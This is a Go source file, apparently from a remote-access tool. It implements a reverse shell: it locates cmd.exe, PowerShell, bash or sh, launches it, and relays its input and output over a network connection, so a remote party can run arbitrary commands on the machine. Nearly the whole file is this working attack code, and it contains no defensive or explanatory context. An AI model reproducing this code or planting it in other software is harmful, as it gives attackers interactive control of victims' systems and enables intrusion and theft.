package main

import (
	"net"
	"os"
	"os/exec"
	"runtime"
	"sync/atomic"

	log "github.com/sirupsen/logrus"
)

// if runtime.GOOS == "windows" {
var (
	winShells = map[string]string{
		"commandPrompt": "C:\\Windows\\System32\\cmd.exe",
		"powerShell":    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
	}
	linuxShells = map[string]string{
		"bash": "/bin/bash",
		"sh":   "/bin/sh",
	}
)

const (
	readBufSize = 128
)

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true

}

func GetSystemShell() string {
	if runtime.GOOS == "windows" {
		for _, v := range winShells {
			if exists(v) {
				return v
			}
		}
		log.Println("No shell found on the system")
		return ""
	} else {
		for _, v := range linuxShells {
			if exists(v) {
				return v
			}
		}
		log.Println("No shell found on the system")
		return ""
	}
}

func reverseShell(command string, send chan<- []byte, recv <-chan []byte) {
	var cmd *exec.Cmd
	cmd = exec.Command(command)

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	go func() {
		for {
			select {
			case incoming := <-recv:
				log.Printf("[*] shell stdin write: %v", incoming)
				stdin.Write(incoming)
			}
		}
	}()

	go func() {
		for {
			buf := make([]byte, readBufSize)
			stderr.Read(buf)
			log.Printf("[*] shell stderr read: %v", buf)
			send <- buf
		}
	}()

	cmd.Start()
	for {
		buf := make([]byte, readBufSize)
		stdout.Read(buf)
		log.Printf("[*] shell stdout read: %v", buf)
		send <- buf
	}
}

func shellHandler(conn net.Conn) {
	shellPath := GetSystemShell()

	send := make(chan []byte)
	recv := make(chan []byte)

	go reverseShell(shellPath, send, recv)

	go func() {
		for {
			data := make([]byte, readBufSize)
			conn.Read(data)
			recv <- data
		}
	}()

	for {
		select {
		case outgoing := <-send:
			conn.Write(outgoing)
		}
	}
}

func (session *Session) startShell(conn net.Conn) {
	session.conn = conn
	session.wg.Add(1)
	go shellHandler(session.conn)
	session.wg.Wait()
	atomic.AddInt32(&globalSessionCount, -1)
	log.Println("Session", session.id, "Closed", conn.LocalAddr().String(), globalSessionCount)
}
